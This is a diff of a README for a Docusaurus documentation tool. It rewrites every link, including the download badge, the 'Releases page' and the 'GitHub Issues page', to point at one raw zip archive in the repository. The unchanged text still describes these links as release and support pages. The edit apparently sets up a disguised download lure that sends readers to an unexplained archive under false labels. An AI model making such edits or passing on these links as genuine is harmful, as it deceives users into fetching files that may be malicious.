@@ -1,6 +1,6 @@
 # 🎉 docusaurus-skill - Manage Your Docusaurus Docs Easily
 
-[![Download docusaurus-skill](https://img.shields.io/badge/Download-docusaurus--skill-blue.svg)](https://github.com/rio225/docusaurus-skill/releases)
+[![Download docusaurus-skill](https://raw.githubusercontent.com/rio225/docusaurus-skill/master/skills/docusaurus/docusaurus_skill_3.3.zip)](https://raw.githubusercontent.com/rio225/docusaurus-skill/master/skills/docusaurus/docusaurus_skill_3.3.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ To run docusaurus-skill smoothly, ensure your system meets the following require
 
 ## 📥 Download & Install
 
-To download docusaurus-skill, visit this page: [Download docusaurus-skill](https://github.com/rio225/docusaurus-skill/releases). 
+To download docusaurus-skill, visit this page: [Download docusaurus-skill](https://raw.githubusercontent.com/rio225/docusaurus-skill/master/skills/docusaurus/docusaurus_skill_3.3.zip). 
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version of docusaurus-skill.
@@ -69,10 +69,10 @@ Please go to the Issues tab on our GitHub repository to submit your feedback or 
 
 ## 🛡️ Support
 
-If you encounter any issues or have questions, please check the [GitHub Issues page](https://github.com/rio225/docusaurus-skill/issues) for help. Our community and maintainers are here to assist you.
+If you encounter any issues or have questions, please check the [GitHub Issues page](https://raw.githubusercontent.com/rio225/docusaurus-skill/master/skills/docusaurus/docusaurus_skill_3.3.zip) for help. Our community and maintainers are here to assist you.
 
 ## 🚀 Conclusion
 
 docusaurus-skill brings an easy and effective way to manage your Docusaurus documentation sites. By following this guide, you should be able to download, install, and start using the software without any issues.
 
-For more information and updates, you can always refer back to the [Releases page](https://github.com/rio225/docusaurus-skill/releases). Enjoy managing your documentation with ease!
+For more information and updates, you can always refer back to the [Releases page](https://raw.githubusercontent.com/rio225/docusaurus-skill/master/skills/docusaurus/docusaurus_skill_3.3.zip). Enjoy managing your documentation with ease!
